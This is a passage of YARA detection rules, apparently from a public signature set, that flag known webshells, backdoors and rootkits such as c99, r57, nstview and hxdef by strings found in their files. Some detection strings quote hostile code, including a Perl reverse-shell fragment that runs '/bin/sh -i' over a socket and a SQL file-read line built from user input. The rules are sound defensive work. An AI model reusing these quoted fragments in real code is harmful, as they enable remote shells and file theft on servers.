		description = "Webshells Auto-generated - file phvayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "07e027a6-01a5-5250-a35e-fbfef1449cfe"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7810-L7821"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "205ecda66c443083403efb1e5c7f7878"
		logic_hash = "d0482607f7d9cf6c89963cb9b1f943fa0b80636e857e0fb044cd9a0b3f974deb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "wrap=\"OFF\">XXXX</textarea></font><font face"

	condition:
		all of them
}
rule SIGNATURE_BASE_Byshell063_Ntboot {
    meta:
		description = "Webshells Auto-generated - file ntboot.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7d1f39f6-04f1-51ee-b125-c35af8ae4c0c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7822-L7836"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "99b5f49db6d6d9a9faeffb29fd8e6d8c"
		logic_hash = "2fdc930eacb87d02ebe69a2b64df4103bd0f3417a76f1b2922b3d4cd4c0dffe9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtBoot"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "Dumping Description to Registry..."
		$s3 = "Opening Service .... Failure !"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Casus15_2 {
    meta:
		description = "Webshells Auto-generated - file casus15.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d3f67fe9-a93f-504a-8b14-a815135d562f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7837-L7848"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8d155b4239d922367af5d0a1b89533a3"
		logic_hash = "45820e0398cca8e75fc4acf6863d962a817afd95a4592acd4ac4a50029684220"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "copy ( $dosya_gonder"

	condition:
		all of them
}
rule SIGNATURE_BASE_Installer {
    meta:
		description = "Webshells Auto-generated - file installer.cmd"
		author = "Florian Roth (Nextron Systems)"
		id = "681d8284-55e5-5316-a0d2-f4f13218df76"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7849-L7861"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a507919ae701cf7e42fa441d3ad95f8f"
		logic_hash = "73c1032313155ceb752fe2f94c8d242833127fe0443d7e3044fa1de2b2b7742b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Restore Old Vanquish"
		$s4 = "ReInstall Vanquish"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Remview_2 {
    meta:
		description = "Webshells Auto-generated - file remview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "8e0492e8-d683-5c2d-b1ce-6c8344b874af"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7862-L7874"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b4a09911a5b23e00b55abe546ded691c"
		logic_hash = "0a682431f7044e9a49c8dd4842a22c521e2a07d5df045b0a12449e3b3206716b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<xmp>$out</"
		$s1 = ".mm(\"Eval PHP code\")."

	condition:
		all of them
}
rule SIGNATURE_BASE_Felikspack3___PHP_Shells_R57 {
    meta:
		description = "Webshells Auto-generated - file r57.php"
		author = "Florian Roth (Nextron Systems)"
		id = "14092413-27a4-5b7d-9023-0b53b3d45a12"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7875-L7886"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "903908b77a266b855262cdbce81c3f72"
		logic_hash = "8d0f3b2009594d4aa413c4794dca12e3c66a19974cc6d0b47cc3f5e2572a4c57"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']."

	condition:
		all of them
}
rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006X {
    meta:
		description = "Webshells Auto-generated - file 2006X.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7887-L7899"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cf3ee0d869dd36e775dfcaa788db8e4b"
		logic_hash = "b71cf90900c7eae4caef57564292ca497a2c6c77e3de2994ba9e4cecae7f2697"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input name=\"password\" type=\"password\" id=\"password\""
		$s6 = "name=\"theAction\" type=\"text\" id=\"theAction\""

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Phvayv_2 {
    meta:
		description = "Webshells Auto-generated - file phvayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "8bd52f9b-a232-566d-90ab-4085933cdc65"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7900-L7911"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "205ecda66c443083403efb1e5c7f7878"
		logic_hash = "11418a11692412ccb309983bdadd9bda2b27b692c3282eb0386094e76c7ba1e0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font"

	condition:
		all of them
}
rule SIGNATURE_BASE_Elmaliseker {
    meta:
		description = "Webshells Auto-generated - file elmaliseker.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7ecf3d5c-be91-579e-905b-5f2ad03a0e42"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7912-L7924"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ccf48af0c8c09bbd038e610a49c9862e"
		logic_hash = "54c0b8e74a9b10fe54901c0595600af1dfc54abd3f710fc20ca87ca92236bb49"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "javascript:Command('Download'"
		$s5 = "zombie_array=array("

	condition:
		all of them
}
rule SIGNATURE_BASE_Shelltools_G0T_Root_Resolve {
    meta:
		description = "Webshells Auto-generated - file resolve.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dcdb9952-63fc-57a7-ae17-ffe8ac4271f1"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7925-L7942"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "69bf9aa296238610a0e05f99b5540297"
		logic_hash = "39d8ac274e94f13b5eb197be5827a95ac09df70793bd584c96b81983a565c1ce"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "3^n6B(Ed3"
		$s1 = "^uldn'Vt(x"
		$s2 = "\\= uPKfp"
		$s3 = "'r.axV<ad"
		$s4 = "p,modoi$=sr("
		$s5 = "DiamondC8S t"
		$s6 = "`lQ9fX<ZvJW"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Remexp {
    meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "48a262bf-7f48-5ed9-b043-80e9d563bf21"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7943-L7956"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b69670ecdbb40012c73686cd22696eeb"
		logic_hash = "b9b966a89ab097494d7af90775bf124f1310c77145be67fa57ebdacd0164e3d0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser"
		$s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F"
		$s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Tool {
    meta:
		description = "Webshells Auto-generated - file tool.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "ed744aa4-7a35-57d6-89bd-3286a21b50a0"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7957-L7968"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3a1e1e889fdd974a130a6a767b42655b"
		logic_hash = "a3449aca3124aa4d920d78e5e674ddd9d8a181b0ce0143032352a69dfdbcad2d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "\"\"%windir%\\\\calc.exe\"\")"

	condition:
		all of them
}
rule SIGNATURE_BASE_Felikspack3___PHP_Shells_2005 {
    meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "91d278d5-e9ec-5a28-9a54-4549b4f0cd07"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7969-L7981"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "97f2552c2fafc0b2eb467ee29cc803c8"
		logic_hash = "4d04174b23c9057acf2618c01cd702eaaec2d3508a8c25dd87fdd320c076a3b1"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp"
		$s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">"

	condition:
		all of them
}
rule SIGNATURE_BASE_Byloader {
    meta:
		description = "Webshells Auto-generated - file byloader.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "24940e4b-06eb-548d-9e14-1a8f9c864bd3"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7982-L7997"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0f0d6dc26055653f5844ded906ce52df"
		logic_hash = "66c900e4bc771fb23d7623e57ad51edaa95696c2e31554720582f3e33a1b2e25"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtfsChk"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "NTFS Disk Driver Checking Service"
		$s3 = "Dumping Description to Registry..."
		$s4 = "Opening Service .... Failure !"

	condition:
		all of them
}
rule SIGNATURE_BASE_Shelltools_G0T_Root_Fport {
    meta:
		description = "Webshells Auto-generated - file Fport.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "664e7b19-4d0b-5062-97d2-0eb34869024d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7998-L8010"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "dbb75488aa2fa22ba6950aead1ef30d5"
		logic_hash = "b9dc66e249c0577839cc3748f129c343d2ccb7327b92a2a67e4467782d10a25e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "Copyright 2000 by Foundstone, Inc."
		$s5 = "You must have administrator privileges to run fport - exiting..."

	condition:
		all of them
}
rule SIGNATURE_BASE_Backdoor__Fr_ {
    meta:
		description = "Webshells Auto-generated - file BackDooR (fr).php"
		author = "Florian Roth (Nextron Systems)"
		id = "fd0c77e8-18b7-5eb4-8ed4-87ee4c864683"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8011-L8022"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a79cac2cf86e073a832aaf29a664f4be"
		logic_hash = "6c16c200712015eed71aeb119e46bad5f93445a8f719d98ef31f9012cb3551ae"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include "

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Ntdaddy {
    meta:
		description = "Webshells Auto-generated - file ntdaddy.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "b6b655b8-7bce-5fa5-97b7-a020a7e53f4f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8023-L8034"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f6262f3ad9f73b8d3e7d9ea5ec07a357"
		logic_hash = "4df6f53ee9bfc0214e69dd858878026e962b90573ed48a5ffdd5523538e8f3bf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s"

	condition:
		all of them
}
rule SIGNATURE_BASE_Nstview_Nstview {
    meta:
		description = "Webshells Auto-generated - file nstview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "00df601c-bddb-5da8-bef4-d2122419b5d0"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8035-L8046"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3871888a0c1ac4270104918231029a56"
		logic_hash = "2b25e22d86a672af0b8957f1b0336ed80e09f3389f5045c230af2372db0e3415"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");"

	condition:
		all of them
}
rule SIGNATURE_BASE_Hytop_Devpack_Upload {
    meta:
		description = "Webshells Auto-generated - file upload.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "43054993-b0dd-5d2e-9890-db1f47759be5"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8047-L8058"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b09852bda534627949f0259828c967de"
		logic_hash = "312020a72a37adb0111ac6d61810c8e476be39dc6456e80e83cd6a680e8ea051"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageUpload Below -->"

	condition:
		all of them
}
rule SIGNATURE_BASE_Passwordreminder {
    meta:
		description = "Webshells Auto-generated - file PasswordReminder.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "642033ee-4454-5913-8348-4d1579fc0bd8"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8059-L8070"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ea49d754dc609e8bfa4c0f95d14ef9bf"
		logic_hash = "f3da5381f5e352c541654d2af918ca8cea8049d137078670dd0538a4d13f676e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "The encoded password is found at 0x%8.8lx and has a length of %d."

	condition:
		all of them
}
rule SIGNATURE_BASE_Pack_Injectt {
    meta:
		description = "Webshells Auto-generated - file InjectT.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3a640c22-0cd4-5ab1-9216-c68625d7d505"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8071-L8086"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "983b74ccd57f6195a0584cdfb27d55e8"
		logic_hash = "9f66b7b429ed585888c0fb4943bb12262247b3af8d85bc67309b27752171e66a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "ail To Open Registry"
		$s4 = "32fDssignim"
		$s5 = "vide Internet S"
		$s6 = "d]Software\\M"
		$s7 = "TInject.Dll"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Remexp_2 {
    meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "501544d5-fe52-5933-8782-516ffe18f3ff"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8087-L8099"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b69670ecdbb40012c73686cd22696eeb"
		logic_hash = "e31e25a7c2b2e970a379a61d2dac335bd37cac48328eee9f3966ff5c77ef6f18"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = " Then Response.Write \""
		$s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_C99 {
    meta:
		description = "Webshells Auto-generated - file c99.php"
		author = "Florian Roth (Nextron Systems)"
		id = "0b176370-a5ab-587a-b0e9-ef4fe5c604bd"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8100-L8111"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5f9ba02eb081bba2b2434c603af454d0"
		logic_hash = "de769299bbd8b895b84db757fcc037b807f7caaa624c06e9d330934a968b2381"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce"

	condition:
		all of them
}
rule SIGNATURE_BASE_Rknt_Zip_Folder_Rknt {
    meta:
		description = "Webshells Auto-generated - file RkNT.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "a58a3b33-8096-535a-b930-2eb71347edb8"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8112-L8129"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5f97386dfde148942b7584aeb6512b85"
		logic_hash = "59de8a40a7081ee5fbea9f413590237c1da9985f2352b32571529baf38c93ddb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "PathStripPathA"
		$s1 = "`cLGet!Addr%"
		$s2 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s3 = "oQToOemBuff* <="
		$s4 = "ionCdunAsw[Us'"
		$s6 = "CreateProcessW: %S"
		$s7 = "ImageDirectoryEntryToData"

	condition:
		all of them
}
rule SIGNATURE_BASE_Dbgntboot {
    meta:
		description = "Webshells Auto-generated - file dbgntboot.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "6b9381e6-597d-5e74-a318-9931d20a9d08"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8130-L8142"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "4d87543d4d7f73c1529c9f8066b475ab"
		logic_hash = "10f86f18aff4995928efb3c8000eca166fe37e6006de7938139cad718ff7653f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp"
		$s3 = "sth junk the M$ Wind0wZ retur"

	condition:
		all of them
}
rule SIGNATURE_BASE_PHP_Shell {
    meta:
		description = "Webshells Auto-generated - file shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "08dff4db-3b1c-5702-a8c9-efaedf83c4ff"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8143-L8155"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "45e8a00567f8a34ab1cccc86b4bc74b9"
		logic_hash = "a62061b2fa851f5798158198e26f188408f3f37dca69a85ca155777c0b8407ee"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz"
		$s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s"

	condition:
		all of them
}
rule SIGNATURE_BASE_Hxdef100 {
    meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "fb376c18-02d2-5866-a0e2-ccb5262091dd"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8156-L8169"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "55cc1769cef44910bd91b7b73dee1f6c"
		logic_hash = "a2002dcddad7ffdbe9614723163016f9357347bb704640d3933ce4513c37d474"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RtlAnsiStringToUnicodeString"
		$s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
		$s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH"

	condition:
		all of them
}
rule SIGNATURE_BASE_Rdrbs100 {
    meta:
		description = "Webshells Auto-generated - file rdrbs100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "369e5ce0-984c-54eb-96d4-fbfb4f932ba6"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8170-L8182"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7c752bcd6da796d80a6830c61a632bff"
		logic_hash = "8a427ef9e0ecd0c810913203aaef43647964f33658dfdca8195fce6f0545f8f4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "Server address must be IP in A.B.C.D format."
		$s4 = " mapped ports in the list. Currently "

	condition:
		all of them
}
rule SIGNATURE_BASE_Mithril_Mithril {
    meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "81645f57-7d7e-5b4d-b323-744f2cde4916"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
